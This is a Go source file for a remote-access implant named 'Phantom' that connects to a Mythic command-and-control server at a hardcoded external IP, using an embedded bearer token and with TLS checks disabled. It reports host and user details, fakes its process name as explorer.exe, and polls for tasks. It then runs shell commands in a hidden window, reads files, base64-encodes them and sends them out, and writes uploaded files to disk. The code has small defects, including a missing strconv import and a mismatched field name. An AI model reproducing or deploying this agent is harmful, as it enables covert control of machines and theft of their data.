package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
        "os/user"
        "runtime"
        "strings"
        "syscall"
        "time"
)

const (
        mythicURL   = "https://37.27.249.191:7443/graphql/"
        jwtToken    = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"
        payloadUUID = "9df7dfc4-f21d-4b03-9962-9f3272669b85"
)

var (
        callbackID     string
        agentCallbackID string
        currentDir     string
        agentActive    = true
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   map[string]interface{} `json:"data"`
        Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
        Message string `json:"message"`
}

func logEvent(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logMsg := fmt.Sprintf("[%s] %s", timestamp, message)
        fmt.Println(logMsg)
        
        file, err := os.OpenFile("phantom_fixed.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
        if err == nil {
                file.WriteString(logMsg + "\n")
                file.Close()
        }
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        payload := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return nil, err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("Authorization", "Bearer "+jwtToken)
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        var graphqlResp GraphQLResponse
        err = json.Unmarshal(body, &graphqlResp)
        if err != nil {
                return nil, err
        }
        
        return &graphqlResp, nil
}

func registerWithMythic() error {
        logEvent("Registering callback with Mythic...")
        
        hostname, _ := os.Hostname()
        currentUser, _ := user.Current()
        username := "system"
        if currentUser != nil {
                username = currentUser.Username
        }
        
        pid := os.Getpid()
        currentDir, _ = os.Getwd()
        
        // Generate unique agent callback ID
        agentCallbackID = fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        query := `
        mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
                        status
                        error
                }
        }`
        
        variables := map[string]interface{}{
                "newCallback": map[string]interface{}{
                        "ip":          "127.0.0.1",
                        "host":        hostname,
                        "user":        username,
                        "description": "Phantom C2 Agent - Commands Ready",
                        "domain":      "",
                        "externalIp":  "127.0.0.1",
                        "extraInfo":   fmt.Sprintf("OS:%s ARCH:%s PID:%d DIR:%s", runtime.GOOS, runtime.GOARCH, pid, currentDir),
                        "processName": "explorer.exe",
                        "sleepInfo":   "3s",
                },
                "payloadUuid": payloadUUID,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return fmt.Errorf("GraphQL request failed: %v", err)
        }
        
        if len(resp.Errors) > 0 {
                return fmt.Errorf("GraphQL errors: %v", resp.Errors)
        }
        
        if data, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
                status := data["status"].(string)
                if status == "success" {
                        logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
                        // Query for callback ID after successful registration
                        err := getCallbackID()
                        if err != nil {
                                logEvent(fmt.Sprintf("Warning: Could not get callback ID: %v", err))
                        }
                        return nil
                } else {
                        errorMsg := ""
                        if err, ok := data["error"].(string); ok {
                                errorMsg = err
                        }
                        return fmt.Errorf("Registration failed: %s", errorMsg)
                }
        }
        
        return fmt.Errorf("Registration failed")
}

func getCallbackID() error {
        hostname, _ := os.Hostname()
        
        query := `
        query getCallback($host: String!) {
                callback(where: {host: {_eq: $host}}, order_by: {id: desc}, limit: 1) {
                        id
                        agent_callback_id
                }
        }`
        
        variables := map[string]interface{}{
                "host": hostname,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                return fmt.Errorf("Query errors: %v", resp.Errors)
        }
        
        if data, ok := resp.Data["callback"].([]interface{}); ok && len(data) > 0 {
                if callback, ok := data[0].(map[string]interface{}); ok {
                        if id, ok := callback["id"].(string); ok {
                                callbackID = id
                                logEvent(fmt.Sprintf("Callback ID: %s", callbackID))
                        }
                        if agentID, ok := callback["agent_callback_id"].(string); ok {
                                agentCallbackID = agentID
                                logEvent(fmt.Sprintf("Agent ID: %s", agentCallbackID))
                        }
                }
        }
        
        return nil
}

func executeCommand(command string, params string) string {
        logEvent(fmt.Sprintf("Executing command: %s with params: %s", command, params))
        
        switch command {
        case "shell":
                return executeShell(params)
        case "ls", "dir":
                return listDirectory(params)
        case "cd":
                return changeDirectory(params)
        case "pwd":
                return getCurrentDirectory()
        case "cat", "type":
                return readFile(params)
        case "download":
                return downloadFile(params)
        case "upload":
                return uploadFile(params)
        case "ps":
                return getProcessList()
        case "whoami":
                return getCurrentUser()
        case "ipconfig":
                return getNetworkInfo()
        case "sysinfo":
                return getSystemInfo()
        default:
                return fmt.Sprintf("Command '%s' not implemented", command)
        }
}

func executeShell(command string) string {
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("/bin/sh", "-c", command)
        }
        
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        
        if err != nil {
                return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
        }
        
        return string(output)
}

func listDirectory(path string) string {
        if path == "" {
                path = currentDir
        }
        
        files, err := ioutil.ReadDir(path)
        if err != nil {
                return fmt.Sprintf("Error reading directory: %v", err)
        }
        
        var result strings.Builder
        result.WriteString(fmt.Sprintf("Directory: %s\n", path))
        result.WriteString("Type       Size      Modified             Name\n")
        result.WriteString("=========================================\n")
        
        for _, file := range files {
                fileType := "FILE"
                if file.IsDir() {
                        fileType = "DIR "
                }
                
                result.WriteString(fmt.Sprintf("%-8s %8d  %s  %s\n", 
                        fileType, file.Size(), file.ModTime().Format("2006-01-02 15:04"), file.Name()))
        }
        
        return result.String()
}

func changeDirectory(path string) string {
        err := os.Chdir(path)
        if err != nil {
                return fmt.Sprintf("Error: %v", err)
        }
        
        currentDir, _ = os.Getwd()
        return fmt.Sprintf("Directory changed to: %s", currentDir)
}

func getCurrentDirectory() string {
        dir, _ := os.Getwd()
        return fmt.Sprintf("Current directory: %s", dir)
}

func readFile(filepath string) string {
        content, err := ioutil.ReadFile(filepath)
        if err != nil {
                return fmt.Sprintf("Error reading file: %v", err)
        }
        
        if len(content) > 2048 {
                return fmt.Sprintf("File too large (%d bytes). Use download command.", len(content))
        }
        
        return fmt.Sprintf("File: %s\n%s", filepath, string(content))
}

func downloadFile(filepath string) string {
        content, err := ioutil.ReadFile(filepath)
        if err != nil {
                return fmt.Sprintf("Error: %v", err)
        }
        
        encoded := base64.StdEncoding.EncodeToString(content)
        return fmt.Sprintf("FILE_DOWNLOAD:%s:%s", filepath, encoded)
}

func uploadFile(params string) string {
        parts := strings.SplitN(params, ":", 2)
        if len(parts) != 2 {
                return "Error: Upload format should be filename:base64data"
        }
        
        filename := parts[0]
        data, err := base64.StdEncoding.DecodeString(parts[1])
        if err != nil {
                return fmt.Sprintf("Error decoding data: %v", err)
        }
        
        err = ioutil.WriteFile(filename, data, 0644)
        if err != nil {
                return fmt.Sprintf("Error writing file: %v", err)
        }
        
        return fmt.Sprintf("File uploaded: %s (%d bytes)", filename, len(data))
}

func getProcessList() string {
        return executeShell("tasklist /fo csv")
}

func getCurrentUser() string {
        user, _ := user.Current()
        return fmt.Sprintf("Username: %s\nUser ID: %s", user.Username, user.Uid)
}

func getNetworkInfo() string {
        return executeShell("ipconfig /all")
}

func getSystemInfo() string {
        hostname, _ := os.Hostname()
        user, _ := user.Current()
        return fmt.Sprintf("Hostname: %s\nUser: %s\nOS: %s\nArch: %s\nPID: %d\nDirectory: %s", 
                hostname, user.Username, runtime.GOOS, runtime.GOARCH, os.Getpid(), currentDir)
}

func sendTaskResponse(taskID string, output string) error {
        logEvent(fmt.Sprintf("Sending response for task %s", taskID))
        
        query := `
        mutation updateTaskOutput($task_id: String!, $response: String!) {
                update_task_by_pk(pk_columns: {id: $task_id}, _set: {
                        status: "completed",
                        completed: true,
                        timestamp: "` + time.Now().Format(time.RFC3339) + `"
                }) {
                        id
                }
                insert_response_one(object: {
                        task_id: $task_id,
                        response: $response
                }) {
                        id
                }
        }`
        
        variables := map[string]interface{}{
                "task_id":  taskID,
                "response": output,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Response send errors: %v", resp.Errors))
        }
        
        return nil
}

func checkForTasks() error {
        if callbackID == "" {
                return nil
        }
        
        query := `
        query getNewTasks($callback_id: Int!) {
                task(where: {
                        callback_id: {_eq: $callback_id}, 
                        status: {_eq: "submitted"}
                }) {
                        id
                        command {
                                cmd
                        }
                        params
                        status
                }
        }`
        
        // Convert callbackID to integer
        callbackIDInt := 0
        if id, err := strconv.Atoi(callbackID); err == nil {
                callbackIDInt = id
        }
        
        variables := map[string]interface{}{
                "callback_id": callbackIDInt,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
                return nil
        }
        
        if data, ok := resp.Data["task"].([]interface{}); ok && len(data) > 0 {
                for _, taskData := range data {
                        if taskMap, ok := taskData.(map[string]interface{}); ok {
                                taskID := taskMap["id"].(string)
                                commandName := taskMap["command_name"].(string)
                                params := ""
                                if p, ok := taskMap["params"].(string); ok {
                                        params = p
                                }
                                
                                logEvent(fmt.Sprintf("Processing task %s: %s", taskID, commandName))
                                
                                output := executeCommand(commandName, params)
                                
                                err := sendTaskResponse(taskID, output)
                                if err != nil {
                                        logEvent(fmt.Sprintf("Error sending response: %v", err))
                                } else {
                                        logEvent("Task completed successfully")
                                }
                        }
                }
        } else {
                logEvent("No new tasks")
        }
        
        return nil
}

func main() {
        logEvent("=== PHANTOM MYTHIC AGENT - FIXED COMMANDS ===")
        logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
        
        err := registerWithMythic()
        if err != nil {
                logEvent(fmt.Sprintf("Registration failed: %v", err))
                return
        }
        
        logEvent("Agent ready - commands will be processed")
        
        // Main command processing loop
        for agentActive {
                err := checkForTasks()
                if err != nil {
                        logEvent(fmt.Sprintf("Task check error: %v", err))
                }
                
                // Sleep with slight jitter
                time.Sleep(2 * time.Second)
        }
}